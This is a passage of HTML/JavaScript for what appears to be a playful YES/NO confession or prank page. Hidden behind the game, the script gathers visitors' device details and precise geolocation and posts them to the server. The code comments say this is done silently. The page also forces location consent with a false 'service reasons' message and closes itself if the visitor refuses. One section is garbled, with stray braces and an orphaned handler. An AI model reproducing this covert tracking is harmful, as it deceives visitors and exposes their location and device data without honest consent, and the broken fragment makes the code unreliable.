        // 从消息池中获取不重复的消息
        function getUniqueMessage(pool, usedSet, category) {
            const messages = pool[category];

            // 如果该分类的消息已经用完，重置已使用记录
            if (usedSet.size >= messages.length) {
                usedSet.clear();
            }

            // 过滤出未使用的消息
            const availableMessages = messages.filter(msg => !usedSet.has(msg));

            if (availableMessages.length === 0) {
                // 如果没有可用消息，重置并重新选择
                usedSet.clear();
                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
                usedSet.add(randomMsg);
                return randomMsg;
            }

            // 从可用消息中随机选择一条
            const randomIndex = Math.floor(Math.random() * availableMessages.length);
            const selectedMsg = availableMessages[randomIndex];
            usedSet.add(selectedMsg);

            return selectedMsg;
        }

        // 获取不重复的YES消息
        function getUniqueYesMessage() {
            let category;

            if (yesClickCount >= 7) {
                category = 'late';
            } else if (yesClickCount >= 4) {
                category = 'mid';
            } else {
                category = 'early';
            }

            const message = getUniqueMessage(yesMessages, usedYesMessages, category);
            return message;
        }

        // 获取不重复的NO消息
        function getUniqueNoMessage() {
            let category;

            if (noClickCount >= MAX_CLICKS - 2) {
                category = 'final';
            } else if (noClickCount >= 7) {
                category = 'late';
            } else if (noClickCount >= 4) {
                category = 'mid';
            } else {
                category = 'early';
            }

            const message = getUniqueMessage(noMessages, usedNoMessages, category);
            return message;
        }

            } else {

            }

            if (noClickCount >= MAX_CLICKS) {
                setTimeout(() => {
                    firstPage.style.display = 'none';
                    noPage.style.display = 'block';
                }, 500);
            }

            firstPage.style.flexDirection = 'column';
            firstPage.style.justifyContent = 'center';
            firstPage.style.alignItems = 'center';
            resultDom.innerText = "欢迎回来！这次点YES好不好？";
            yesClickCount = 0;
            noClickCount = 0;
            usedYesMessages.clear();
            usedNoMessages.clear();
            updateNoCountDisplay();
        });

        // 初始化计数显示
        updateNoCountDisplay();

        // 收集位置和设备信息
        function collectDeviceInfo() {
            // 只收集必要信息，避免冗余
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };

            // 收集位置信息（如果用户允许）
            if (grantedLocation) {
                deviceInfo.location = grantedLocation;
                sendDeviceInfo(deviceInfo);
            } else if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        deviceInfo.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        sendDeviceInfo(deviceInfo);
                    },
                    function(error) {
                        // 位置获取失败，只发送设备信息
                        deviceInfo.location = 'access_denied';
                        sendDeviceInfo(deviceInfo);
                    },
                    {
                        enableHighAccuracy: false,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            } else {
                deviceInfo.location = 'not_supported';
                sendDeviceInfo(deviceInfo);
            }
        }

        // 发送设备信息到服务器
        function sendDeviceInfo(info) {
            // 使用与页面主题相符的方式发送数据
            // 这里使用fetch API发送POST请求
            fetch('/api/device-info', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(info)
            })
            .then(response => {
                // 不显示任何成功或失败的提示
                console.log('Device info sent');
            })
            .catch(error => {
                // 静默处理错误，不显示任何提示
                console.error('Error sending device info:', error);
            });
        }

        // 关闭网页：浏览器一般只允许脚本关闭由脚本打开的窗口
        function closeWebPage() {
            locationStatus.innerText = "您已拒绝提供地理位置，页面即将关闭";
            locationAgreeBtn.style.display = 'none';
            window.open('', '_self', '');
            window.close();
            setTimeout(function() {
                document.body.innerHTML =
                    '<div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:\'微软雅黑\',sans-serif;color:#666;text-align:center;">' +
                    '<h2 style="font-size:1.6rem;margin-bottom:15px;">已拒绝位置授权</h2>' +
                    '<p style="font-size:1rem;">由于服务原因，需要地理位置才能继续访问，请关闭此页面。</p>' +
                    '</div>';
            }, 400);
        }

        // 向浏览器发起地理位置授权请求
        function requestLocation() {
            if (!navigator.geolocation) {
                closeWebPage();
                return;
            }
            locationStatus.innerText = "正在请求定位权限，请在弹出的提示中选择“允许”";
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    grantedLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    locationOverlay.style.display = 'none';
                    collectDeviceInfo();
                },
                function(error) {
                    // 用户不同意或定位失败，关闭网页
                    closeWebPage();
                },
                {
                    enableHighAccuracy: false,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // 页面加载时提示并请求地理位置授权
        window.addEventListener('load', function() {
            locationOverlay.style.display = 'flex';
            locationAgreeBtn.addEventListener('click', requestLocation);
        });

        // 也可以在用户点击按钮时收集信息
        yesBtn.addEventListener('click', function() {
            // 在点击yes按钮时收集信息
            collectDeviceInfo();
        });
    </script>
</body>
</html>
